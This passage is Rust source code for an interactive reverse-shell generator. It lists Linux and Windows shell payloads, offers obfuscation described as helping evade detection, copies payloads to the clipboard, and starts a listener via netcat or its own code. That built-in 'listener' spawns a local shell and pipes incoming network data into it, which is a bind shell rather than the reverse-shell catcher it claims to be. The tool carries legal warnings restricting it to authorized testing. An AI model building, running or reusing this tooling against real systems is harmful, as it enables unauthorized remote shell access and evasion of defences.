    println!("{}", format!("[+] Listener bound to 0.0.0.0:{}", port).green());

    println!("{}", "[*] Waiting for incoming connection...".cyan());
    let (stream, addr) = listener.accept().await?;
    println!("{}", format!("[+] Connection received from: {}", addr).green().bold());

    // Split the stream into read and write halves
    let (mut reader, writer) = stream.into_split();

    // Spawn shell process
    let mut child = tokio::process::Command::new(get_shell_command())
        .stdin(std::process::Stdio::piped())
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        .spawn()?;

    let stdin = child.stdin.take().expect("Failed to get stdin");
    let stdout = child.stdout.take().expect("Failed to get stdout");
    let stderr = child.stderr.take().expect("Failed to get stderr");

    // Create a broadcast channel to send shell output to network
    let (shell_output_tx, mut shell_output_rx) = mpsc::unbounded_channel::<Vec<u8>>();

    // Task 1: Read from network and send to shell
    let shell_stdin = stdin;
    tokio::spawn(async move {
        let mut buffer = [0; 1024];
        let mut shell_stdin = shell_stdin;

        loop {
            match reader.read(&mut buffer).await {
                Ok(0) => break, // Connection closed
                Ok(n) => {
                    if shell_stdin.write_all(&buffer[..n]).await.is_ok() {
                        let _ = shell_stdin.flush().await;
                    } else {
                        break;
                    }
                }
                Err(_) => break,
            }
        }
    });

    // Task 2: Read from shell stdout and send to output channel
    let output_tx = shell_output_tx.clone();
    tokio::spawn(async move {
        let mut stdout = stdout;
        let mut buffer = [0; 1024];

        loop {
            match stdout.read(&mut buffer).await {
                Ok(0) => break, // Process ended
                Ok(n) => {
                    if output_tx.send(buffer[..n].to_vec()).is_err() {
                        break;
                    }
                }
                Err(_) => break,
            }
        }
    });

    // Task 3: Read from shell stderr and send to output channel
    let output_tx = shell_output_tx;
    tokio::spawn(async move {
        let mut stderr = stderr;
        let mut buffer = [0; 1024];

        loop {
            match stderr.read(&mut buffer).await {
                Ok(0) => break, // Process ended
                Ok(n) => {
                    if output_tx.send(buffer[..n].to_vec()).is_err() {
                        break;
                    }
                }
                Err(_) => break,
            }
        }
    });

    // Task 4: Write shell output to network
    tokio::spawn(async move {
        let mut writer = writer;
        while let Some(output) = shell_output_rx.recv().await {
            if writer.write_all(&output).await.is_err() {
                break;
            }
            if writer.flush().await.is_err() {
                break;
            }
        }
    });

    // Wait for the process to finish
    let _ = child.wait().await;
    Ok(())
}

fn get_shell_command() -> String {
    if cfg!(target_os = "windows") {
        "cmd.exe".to_string()
    } else {
        "/bin/sh".to_string()
    }
}

fn display_banner() {
    display_fancy_banner();
}

fn display_config(config: &Config) {
    println!("\n{}", "┌─[ Configuration ]─────────────────────────────────────────────────────┐".blue());
    println!("{}", format!("│ {: <75} │", "CURRENT CONFIGURATION".green().bold()).blue());
    println!("{}", "├─────────────────────────────────────────────────────────────────────┤".blue());

    let format_line = |name: &str, value: &str, color: Color| {
        println!("{}", format!("│ {: <15} : {: <55} │", name.cyan().bold(), value.color(color)).blue());
    };

    format_line("Local IP", &config.local_ip, Color::Yellow);
    format_line("Public IP", &config.public_ip, Color::Yellow);

    let active_ip_display = format!("{} ({})", config.active_ip, config.active_ip_type);
    format_line("Active IP", &active_ip_display, Color::Green);
    format_line("Port", &config.port.to_string(), Color::Green);

    let listener_type_str = match config.listener_type {
        ListenerType::BuiltIn => "Built-in",
        ListenerType::Netcat => "Netcat (nc)",
    };
    format_line("Listener", listener_type_str, Color::Green);

    println!("{}", "└─────────────────────────────────────────────────────────────────────┘".blue());
}

fn display_payloads(payloads: &[RenderedPayload], port: u16, obfuscation: ObfuscationType) {
    if payloads.is_empty() {
        println!("{}", "\n[i] No payloads found".yellow());
        return;
    }

    println!("\n{}", "┌─[ Payloads ]─────────────────────────────────────────────────────────┐".blue());
    println!("{}", format!("│ {: <75} │", format!("Found {} payloads", payloads.len()).cyan()).blue());
    println!("{}", "├─────────────────────────────────────────────────────────────────────┤".blue());

    for (idx, payload) in payloads.iter().enumerate() {
        println!("{}", format!("│ {: <75} │", "").blue());
        let obfuscation_str = if obfuscation != ObfuscationType::None {
            format!(" [OBFUSCATED: {:?}]", obfuscation).magenta().to_string()
        } else {
            "".to_string()
        };
        println!("{}", format!("│ {}. {: <20} [{}] [OS: {}] {}",
            (idx + 1).to_string().green().bold(),
            payload.name.cyan().bold(),
            payload.lang.blue(),
            payload.os.to_string().blue(),
            obfuscation_str).blue());
        println!("{}", format!("│ {: <75} │", "").blue());

        let formatted_payload = format_payload(&payload.payload, 73);
        println!("{}", format!("│   Payload: {: <66} │", formatted_payload.yellow()).blue());
        println!("{}", format!("│ {: <75} │", "").blue());
    }
    println!("{}", "└─────────────────────────────────────────────────────────────────────┘".blue());

    println!("\n{}", format!("┌─[ Listener Command ]─────────────────────────────────────────────────┐").blue());
    println!("{}", format!("│ {: <75} │", format!("nc -lvnp {}", port).yellow().bold()).blue());
    println!("{}", "└─────────────────────────────────────────────────────────────────────┘".blue());

    if !payloads.is_empty() {
        println!("{}", "\n[*] Would you like to copy a payload to clipboard? (y/n): ".blue());
        let choice = get_input("");
        if choice.eq_ignore_ascii_case("y") {
            let payload_num = get_input("Enter payload number to copy: ");
            if let Ok(num) = payload_num.parse::<usize>() {
                if num > 0 && num <= payloads.len() {
                    let selected_payload = &payloads[num - 1].payload;
                    copy_to_clipboard(selected_payload);
                } else {
                    println!("{}", "[!] Invalid payload number".red());
                }
            } else {
                println!("{}", "[!] Invalid input".red());
            }
            let _ = get_input("Press Enter to continue...");
        }
    }
}

fn format_payload(payload: &str, max_width: usize) -> String {
    if payload.len() <= max_width {
        return payload.to_string();
    }
    format!("{}...", &payload[0..max_width-3])
}

fn display_help() {
    clear_screen();
    display_fancy_banner();

    println!("\n{}", "┌─[ Help & Usage ]─────────────────────────────────────────────────────┐".blue());
    println!("{}", format!("│ {: <75} │", "HELP & USAGE GUIDE".green().bold()).blue());
    println!("{}", "├─────────────────────────────────────────────────────────────────────┤".blue());
    println!("{}", format!("│ {: <75} │", "").blue());
    println!("{}", format!("│ {: <75} │", "MAIN COMMANDS:".cyan().bold()).blue());
    println!("{}", format!("│ {: <75} │", "  1. Generate Linux Shells - Create reverse shells for Linux systems".blue()));
    println!("{}", format!("│ {: <75} │", "  2. Generate Windows Shells - Create reverse shells for Windows systems".blue()));
    println!("{}", format!("│ {: <75} │", "  3. Reconfigure IP/Port - Change your IP address or port settings".blue()));
    println!("{}", format!("│ {: <75} │", "  4. Start Listener - Start a listener to catch reverse shells".blue()));
    println!("{}", format!("│ {: <75} │", "  5. Configure Listener Type - Choose between built-in or netcat listener".blue()));
    println!("{}", format!("│ {: <75} │", "  6. Save Current Config - Save your current settings for later".blue()));
    println!("{}", format!("│ {: <75} │", "  7. Load Config - Load previously saved settings".blue()));
    println!("{}", format!("│ {: <75} │", "  8. Exit - Exit the application".blue()));
    println!("{}", format!("│ {: <75} │", "").blue());
    println!("{}", format!("│ {: <75} │", "PAYLOAD OPTIONS:".cyan().bold()).blue());
    println!("{}", format!("│ {: <75} │", "  - Each payload can be generated for different languages (bash, python, etc.)".blue()));
    println!("{}", format!("│ {: <75} │", "  - Obfuscation options help evade basic detection".blue()));
    println!("{}", format!("│ {: <75} │", "  - Use the clipboard feature to copy payloads directly".blue()));
    println!("{}", format!("│ {: <75} │", "").blue());
    println!("{}", format!("│ {: <75} │", "LEGAL:".cyan().bold()).blue());
    println!("{}", format!("│ {: <75} │", "  This tool is for authorized penetration testing and CTFs ONLY.".blue()));
    println!("{}", format!("│ {: <75} │", "  Use responsibly and within legal boundaries.".blue()));
    println!("{}", format!("│ {: <75} │", "").blue());
    println!("{}", "└─────────────────────────────────────────────────────────────────────┘".blue());

    let _ = get_input("\nPress Enter to return to main menu...");
}

fn search_payloads(all_shells: &[ShellPayload], config: &Config) {
    clear_screen();
    display_fancy_banner();
    display_config(config);

    println!("\n{}", "┌─[ Search Payloads ]──────────────────────────────────────────────────┐".blue());
    println!("{}", format!("│ {: <75} │", "SEARCH PAYLOADS".green().bold()).blue());
    println!("{}", "├─────────────────────────────────────────────────────────────────────┤".blue());

    let search_term = get_input("Enter search term (name, language, or OS): ");

    if search_term.is_empty() {
        println!("{}", "[!] Empty search term. Returning to menu...".red());
        let _ = get_input("Press Enter to continue...");
        return;
    }

    let filtered_payloads: Vec<RenderedPayload> = all_shells
        .iter()
        .filter(|payload| {
            payload.name.to_lowercase().contains(&search_term.to_lowercase()) ||
            payload.lang.to_lowercase().contains(&search_term.to_lowercase()) ||
            format!("{:?}", payload.os).to_lowercase().contains(&search_term.to_lowercase())
        })
        .map(|payload| RenderedPayload {
            name: payload.name,
            lang: payload.lang,
            os: payload.os,
            payload: payload.template.render(config),
        })
        .collect();

    println!("{}", format!("│ {: <75} │", format!("Found {} payloads matching '{}'", filtered_payloads.len(), search_term).yellow().bold()).blue());
    println!("{}", "└─────────────────────────────────────────────────────────────────────┘".blue());

    if !filtered_payloads.is_empty() {
        display_payloads(&filtered_payloads, config.port, ObfuscationType::None);
    } else {
        println!("{}", "[i] No payloads found matching your search".yellow());
        let _ = get_input("\nPress Enter to continue...");
    }
}

fn select_listener_type(config: &mut Config) {
    loop {
        clear_screen();
        display_banner();
        display_config(config);

        println!("\n{}", "[*] SELECT LISTENER TYPE".cyan().bold());
        println!("{}", "─".repeat(80).bold());
        println!("  {} Built-in Rust listener", "[1]".green());
        println!("  {} Netcat (nc/ncat)", "[2]".green());
        println!("{}", "─".repeat(80).bold());

        let choice = get_input("Select listener (1-2): ");

        match choice.as_str() {
            "1" => {
                config.listener_type = ListenerType::BuiltIn;
                println!("{}", "[+] Listener set to Built-in Rust listener!".green());
                break;
            }
            "2" => {
                config.listener_type = ListenerType::Netcat;
                println!("{}", "[+] Listener set to Netcat (nc/ncat) listener!".green());
                break;
            }
            _ => {
                println!("{}", "[!] Invalid choice. Please select 1-2".red());
                let _ = get_input("\nPress Enter to continue...");
            }
        }
    }
}

fn copy_to_clipboard(text: &str) {
    #[cfg(feature = "clipboard")]
    {
        let mut ctx: ClipboardContext = match ClipboardProvider::new() {
            Ok(ctx) => ctx,
            Err(_) => {
                println!("{}", "[!] Could not access clipboard".red());
                return;
            }
        };

        if let Err(_) = ctx.set_contents(text.to_string()) {
            println!("{}", "[!] Failed to copy to clipboard".red());
        } else {
            println!("{}", "[+] Payload copied to clipboard!".green());
        }
    }
    #[cfg(not(feature = "clipboard"))]
    {
        println!("{}", "[!] Clipboard feature not available".red());
        // Use the text parameter to avoid unused variable warning
        let _ = text;
    }
}

fn initial_setup(config: &mut Config) {
    loop {
        clear_screen();
        display_banner();
        println!(
            "\n{}",
            "╔══════════════════════════════════════════════════════════════════════════════╗"
                .bold()
        );
        println!(
            "{}  {}  {}",
            "║".bold(),
            "INITIAL CONFIGURATION".yellow().bold(),
            format!("{: <56}║", "").bold()
        );
        println!(
            "{}",
            "╚══════════════════════════════════════════════════════════════════════════════╝"
                .bold()
        );

        println!("\n{}", "[*] IP ADDRESS SELECTION".cyan().bold());
        println!("{}", "─".repeat(80).bold());
        println!(
            "  {} Use Local IP:  {}",
            "[1]".green(),
            config.local_ip.yellow()
        );
        println!(
            "  {} Use Public IP: {}",
            "[2]".green(),
            config.public_ip.yellow()
        );
        println!("  {} Enter Custom IP", "[3]".green());
        println!("{}", "─".repeat(80).bold());

        let choice = get_input("Select IP option (1-3): ");

        match choice.as_str() {
            "1" => {
                config.active_ip = config.local_ip.clone();
                config.active_ip_type = "Local".to_string();
                println!(
                    "{}",
                    format!("[+] IP set to Local: {}", config.active_ip).green()
                );
                break;
            }
            "2" => {
                config.active_ip = config.public_ip.clone();
                config.active_ip_type = "Public".to_string();
                println!(
                    "{}",
                    format!("[+] IP set to Public: {}", config.active_ip).green()
                );
                break;
            }
            "3" => {
                let custom_ip = get_input("Enter custom IP address: ");
                match validate_ip(&custom_ip) {
                    Ok(_) => {
                        config.active_ip = custom_ip;
                        config.active_ip_type = "Custom".to_string();
                        println!(
                            "{}",
                            format!("[+] IP set to Custom: {}", config.active_ip).green()
                        );
                        break;
                    }
                    Err(e) => {
                        println!("{}", format!("[!] {}", e).red());
                        let _ = get_input("Press Enter to continue...");
                    }
                }
            }
            _ => {
                println!("{}", "[!] Invalid option. Please select 1, 2, or 3.".red());
                let _ = get_input("Press Enter to continue...");
            }
        }
    }

    loop {
        println!("\n{}", "[*] PORT SELECTION".cyan().bold());
        println!("{}", "─".repeat(80).bold());
        println!("  {} Use port 4444 (default)", "[1]".green());
        println!("  {} Use port 1337", "[2]".green());
        println!("  {} Use port 9001", "[3]".green());
        println!("  {} Enter custom port", "[4]".green());
        println!("{}", "─".repeat(80).bold());

        let choice = get_input("Select port option (1-4): ");

        match choice.as_str() {
            "1" => {
                config.port = 4444;
                println!("{}", format!("[+] Port set to: {}", config.port).green());
                break;
            }
            "2" => {
                config.port = 1337;
                println!("{}", format!("[+] Port set to: {}", config.port).green());
                break;
            }
            "3" => {
                config.port = 9001;
                println!("{}", format!("[+] Port set to: {}", config.port).green());
                break;
            }
            "4" => {
                let custom_port = get_input("Enter custom port (1-65535): ");
                if let Ok(port_num) = custom_port.parse::<u16>() {
                    match validate_port(port_num) {
                        Ok(_) => {
                            config.port = port_num;
                            println!("{}", format!("[+] Port set to: {}", config.port).green());
                            break;
                        }
                        Err(e) => {
                            println!("{}", format!("[!] {}", e).red());
                        }
                    }
                } else {
                    println!("{}", "[!] Invalid port number. Try again.".red());
                }
            }
            _ => println!(
                "{}",
                "[!] Invalid option. Please select 1, 2, 3, or 4.".red()
            ),
        }
    }

    println!("\n{}", "[✓] Configuration complete!".green().bold());
    let _ = get_input("\nPress Enter to continue...");
}

fn os_submenu(config: &mut Config, os_type: OsType, all_shells: &[ShellPayload]) {
    let os_name = os_type.to_string();
    let available_languages: Vec<String> = all_shells
        .iter()
        .filter(|payload| payload.os == os_type)
        .map(|payload| payload.lang.to_string())
        .collect::<HashSet<_>>()
        .into_iter()
        .collect();

    loop {
        clear_screen();
        display_banner();
        display_config(config);

        println!(
            "\n{}",
            "╔══════════════════════════════════════════════════════════════════════════════╗"
                .bold()
        );
        println!(
            "{}  {} SHELLS MENU{}",
            "║".bold(),
            os_name.to_uppercase().cyan().bold(),
            format!("{: <61}║", "").bold()
        );
        println!(
            "{}",
            "╚══════════════════════════════════════════════════════════════════════════════╝"
                .bold()
        );

        println!("{}", "┌─[ Shell Generation Options ]─────────────────────────────────────────┐".blue());
        println!("  {} {}", "[1]".green().bold(), "Show All Shells (Top 5)".cyan());
        println!("  {} {}", "[2]".green().bold(), "Browse by Language".cyan());
        println!("  {} {}", "[3]".green().bold(), "Show All Available Shells".cyan());
        println!("  {} {}", "[4]".green().bold(), "Generate Shells & Start Listener".cyan());
        println!("  {} {}", "[5]".green().bold(), "Generate Obfuscated Shells (Top 5)".cyan());
        println!("  {} {}", "[6]".green().bold(), "Search Payloads".cyan());
        println!("{}", "└────────────────────────────────────────────────────────────────────┘".blue());

        println!("{}", format!("┌─[ Quick Access Languages ]───────────────────────────────────────────┐").magenta());
        println!("  {}", "Quick Access Languages:".magenta().bold());
        let quick_access = match os_type {
            OsType::Linux => vec![("b", "bash"), ("p", "python"), ("z", "zsh"), ("n", "socat")],
            OsType::Windows => vec![("p", "powershell"), ("c", "cmd"), ("v", "vbs"), ("h", "c#")],
        };
        for (key, lang) in &quick_access {
            println!(
                "  {} {} menu",
                format!("[{}]", key).green().bold(),
                capitalize_string(lang).yellow()
            );
        }
        println!("{}", format!("└────────────────────────────────────────────────────────────────────┘").magenta());

        println!("{}", format!("┌─[ Navigation ]───────────────────────────────────────────────────────┐").blue());
        println!("  {} {}", "[7]".green().bold(), "Back to Main Menu".yellow());
        println!("{}", "└────────────────────────────────────────────────────────────────────┘".blue());

        let choice = get_input("Select option: ");

        match choice.as_str() {
            "1" => {
                let payloads = render_payloads(all_shells, os_type, None, Some(5), config, ObfuscationType::None);
                display_payloads(&payloads, config.port, ObfuscationType::None);
                let _ = get_input("\nPress Enter to continue...");
            }
            "2" => loop {
                clear_screen();
                display_banner();
                display_config(config);
                println!(
                    "\n{}",
                    "╔══════════════════════════════════════════════════════════════════════════════╗".bold()
                );
                println!(
                    "{}  {}  {}",
                    "║".bold(),
                    "AVAILABLE LANGUAGES".cyan().bold(),
                    format!("{: <58}║", "").bold()
                );
                println!(
                    "{}",
                    "╚══════════════════════════════════════════════════════════════════════════════╝".bold()
                );

                let mut sorted_langs = available_languages.clone();
                sorted_langs.sort();

                for (idx, lang) in sorted_langs.iter().enumerate() {
                    println!(
                        "  {} {}",
                        format!("[{}]", idx + 1).green(),
                        capitalize_string(lang)
                    );
                }
                println!("{}", "─".repeat(80).bold());
                println!("  {} Back to {} Menu", "[0]".green(), os_name);
                println!("{}", "─".repeat(80).bold());

                let lang_choice = get_input("Select language number: ");

                if lang_choice == "0" {
                    break;
                } else if let Ok(idx) = lang_choice.parse::<usize>() {
                    if (1..=sorted_langs.len()).contains(&idx) {
                        let selected_lang = &sorted_langs[idx - 1];
                        language_submenu(config, os_type, selected_lang, all_shells);
                    } else {
                        println!("{}", "[!] Invalid selection".red());
                        let _ = get_input("\nPress Enter to continue...");
                    }
                } else {
                    println!("{}", "[!] Invalid selection".red());
                    let _ = get_input("\nPress Enter to continue...");
                }
            },
            "3" => {
                let payloads = render_payloads(all_shells, os_type, None, None, config, ObfuscationType::None);
                display_payloads(&payloads, config.port, ObfuscationType::None);
                let _ = get_input("\nPress Enter to continue...");
            }
            "4" => {
                let payloads = render_payloads(all_shells, os_type, None, Some(5), config, ObfuscationType::None);
                display_payloads(&payloads, config.port, ObfuscationType::None);
                let confirm = get_input("\nStart listener now? (y/n): ");
                if confirm.eq_ignore_ascii_case("y") {
                    start_listener(&config);
                }
                let _ = get_input("\nPress Enter to continue...");
            }
            "5" => {
                let obfuscation = select_obfuscation_type();
                let payloads = render_payloads(all_shells, os_type, None, Some(5), config, obfuscation);
                display_payloads(&payloads, config.port, obfuscation);
                let _ = get_input("\nPress Enter to continue...");
            }
            "6" => {
                search_payloads(all_shells, config);
            }
            "7" => break,
            _ if choice.len() == 1 => {
                if let Some((_, lang)) = quick_access.iter().find(|(key, _)| key == &choice) {
                    language_submenu(config, os_type, lang, all_shells);
                } else {
                    println!("{}", "[!] Invalid option".red());
                    let _ = get_input("\nPress Enter to continue...");
                }
            }
            _ => {
                println!("{}", "[!] Invalid option".red());
                let _ = get_input("\nPress Enter to continue...");
            }
        }
    }
}

fn language_submenu(
    config: &mut Config,
    os_type: OsType,
    language: &str,
    all_shells: &[ShellPayload],
) {
    loop {
        clear_screen();
        display_banner();
        display_config(config);

        println!(
            "\n{}",
            "╔══════════════════════════════════════════════════════════════════════════════╗"
                .bold()
        );
        println!(
            "{}  {} SHELLS - {}{}",
            "║".bold(),
            language.to_uppercase().cyan().bold(),
            os_type.to_string().to_uppercase().cyan().bold(),
            format!("{: <50}║", "").bold()
        );
        println!(
            "{}",
            "╚══════════════════════════════════════════════════════════════════════════════╝"
                .bold()
        );

        println!(
            "  {} Show All {} Shells",
            "[1]".green(),
            capitalize_string(language)
        );
        println!(
            "  {} Show Top 5 {} Shells",
            "[2]".green(),
            capitalize_string(language)
        );
        println!(
            "  {} Show All {} Shells (Obfuscated)",
            "[3]".green(),
            capitalize_string(language)
        );
        println!(
            "  {} Show Top 5 {} Shells (Obfuscated)",
            "[4]".green(),
            capitalize_string(language)
        );
        println!("  {} Generate & Start Listener", "[5]".green());
        println!("  {} Back to {} Menu", "[6]".green(), os_type.to_string());
        println!("{}", "─".repeat(80).bold());

        let choice = get_input("Select option: ");

        match choice.as_str() {
            "1" => {
                let payloads = render_payloads(all_shells, os_type, Some(language), None, config, ObfuscationType::None);
                display_payloads(&payloads, config.port, ObfuscationType::None);
                let _ = get_input("\nPress Enter to continue...");
            }
            "2" => {
                let payloads =
                    render_payloads(all_shells, os_type, Some(language), Some(5), config, ObfuscationType::None);
                display_payloads(&payloads, config.port, ObfuscationType::None);
                let _ = get_input("\nPress Enter to continue...");
            }
            "3" => {
                let obfuscation = select_obfuscation_type();
                let payloads = render_payloads(all_shells, os_type, Some(language), None, config, obfuscation);
                display_payloads(&payloads, config.port, obfuscation);
                let _ = get_input("\nPress Enter to continue...");
            }
            "4" => {
                let obfuscation = select_obfuscation_type();
                let payloads = render_payloads(all_shells, os_type, Some(language), Some(5), config, obfuscation);
                display_payloads(&payloads, config.port, obfuscation);
                let _ = get_input("\nPress Enter to continue...");
            }
            "5" => {
                let payloads = render_payloads(all_shells, os_type, Some(language), None, config, ObfuscationType::None);
                display_payloads(&payloads, config.port, ObfuscationType::None);

                let confirm = get_input("\nStart listener now? (y/n): ");
                if confirm.eq_ignore_ascii_case("y") {
                    start_listener(&config);
                }
                let _ = get_input("\nPress Enter to continue...");
            }
            "6" => break,
            _ => {
                println!("{}", "[!] Invalid option".red());
                let _ = get_input("\nPress Enter to continue...");
            }
        }
    }
}

fn main_loop() -> Result<(), io::Error> {
    // Try to load existing config, otherwise create default
    let (local_ip, public_ip) = (get_local_ip(), get_public_ip());

    let mut config = if let Some(saved_config) = load_config() {
        saved_config
    } else {
        Config {
            active_ip: local_ip.clone(),
            active_ip_type: "Local".to_string(),
            local_ip,
            public_ip,
            port: 4444,
            listener_type: ListenerType::BuiltIn,
        }
    };

    let all_shells = get_all_payloads();

    clear_screen();
    display_banner();
    println!(
        "\n{}",
        "┌────────────────────────────────────────────────────────────────────────┐"
            .red()
            .bold()
    );
    println!(
        "{}  {}  {}",
        "│".red().bold(),
        "⚠️  LEGAL WARNING ⚠️".yellow().bold(),
        format!("{: <60}│", "").red().bold()
    );
    println!(
        "{}",
        "└────────────────────────────────────────────────────────────────────────┘"
            .red()
            .bold()
    );
    println!(
        "{}",
        "This tool generates REAL reverse shell payloads. Use it responsibly and legally for CTF and authorized testing ONLY.".yellow()
    );
    println!(
        "{}",
        "Unauthorized access to computer systems is ILLEGAL."
            .red()
            .bold()
    );
    println!("{}", "─".repeat(80).bold());

    let confirm = get_input("\nI understand and will use this tool responsibly (yes/no): ");
    if !confirm.eq_ignore_ascii_case("yes") {
        println!("{}", "\n[*] Exiting. Use responsibly!".yellow());
        std::process::exit(0);
    }

    if config.local_ip.is_empty() || config.public_ip.contains("Not Available") {
        initial_setup(&mut config);
    }

    loop {
        clear_screen();
        display_banner();
        display_config(&config);

        println!(
            "\n{}",
            "╔══════════════════════════════════════════════════════════════════════════════╗"
                .bold()
        );
        println!(
            "{}  {}  {}",
            "║".bold(),
            "MAIN MENU".cyan().bold(),
            format!("{: <68}║", "").bold()
        );
        println!(
            "{}",
            "╚══════════════════════════════════════════════════════════════════════════════╝"
                .bold()
        );

        println!("\n{}", "┌─[ Main Menu ]─────────────────────────────────────────────────────────┐".blue());
        println!("{}", format!("│ {: <75} │", "").blue());
        println!("{}", format!("│ {: <75} │", "1. Generate Linux Shells".cyan()).blue());
        println!("{}", format!("│ {: <75} │", "2. Generate Windows Shells".cyan()).blue());
        println!("{}", format!("│ {: <75} │", "3. Reconfigure IP/Port".cyan()).blue());
        println!("{}", format!("│ {: <75} │", "4. Start Listener".cyan()).blue());
        println!("{}", format!("│ {: <75} │", "5. Configure Listener Type".cyan()).blue());
        println!("{}", format!("│ {: <75} │", "6. Save Current Config".cyan()).blue());
        println!("{}", format!("│ {: <75} │", "7. Load Config".cyan()).blue());
        println!("{}", format!("│ {: <75} │", "8. Help".cyan()).blue());
        println!("{}", format!("│ {: <75} │", "9. Exit".cyan()).blue());
        println!("{}", format!("│ {: <75} │", "").blue());
        println!("{}", "└─────────────────────────────────────────────────────────────────────┘".blue());
        display_main_menu_help();

        let choice = get_input("Select option: ");

        match choice.as_str() {
            "1" => os_submenu(&mut config, OsType::Linux, &all_shells),
            "2" => os_submenu(&mut config, OsType::Windows, &all_shells),
            "3" => {
                let _ = get_input("\nReconfiguration: Press Enter to re-run initial setup...");
                initial_setup(&mut config);
            }
            "4" => {
                start_listener(&config);
                let _ = get_input("\nPress Enter to continue...");
            }
            "5" => {
                select_listener_type(&mut config);
                let _ = get_input("\nPress Enter to continue...");
            }
            "6" => {
                match save_config(&config) {
                    Ok(_) => println!("{}", "[+] Configuration saved successfully!".green()),
                    Err(e) => println!("{}", format!("[!] Error saving config: {}", e).red()),
                }
                let _ = get_input("\nPress Enter to continue...");
            }
            "7" => {
                if let Some(loaded_config) = load_config() {
                    config = loaded_config;
                    println!("{}", "[+] Configuration loaded successfully!".green());
                } else {
                    println!("{}", "[!] No saved configuration found!".red());
                }
                let _ = get_input("\nPress Enter to continue...");
            }
            "8" => {
                display_help();
            }
            "9" => {
                println!("{}", "\n[*] Exiting... Stay safe and legal!".green());
                break;
            }
            _ => {
                println!("{}", "[!] Invalid option".red());
                let _ = get_input("\nPress Enter to continue...");
            }
        }
    }

    Ok(())
}


fn capitalize_string(s: &str) -> String {
    let mut chars = s.chars();
    match chars.next() {
        None => String::new(),
        Some(first) => first.to_uppercase().collect::<String>() + chars.as_str(),
    }
}

fn main() {
    if let Err(error) = main_loop() {
        eprintln!(
            "{}",
            format!(
                "\n\n[*] An unexpected I/O error occurred: {}. Exiting.",
                error
            )
            .red()
            .bold()
        );
    }
    println!("{}", "\n[i] bye".red().bold());
}
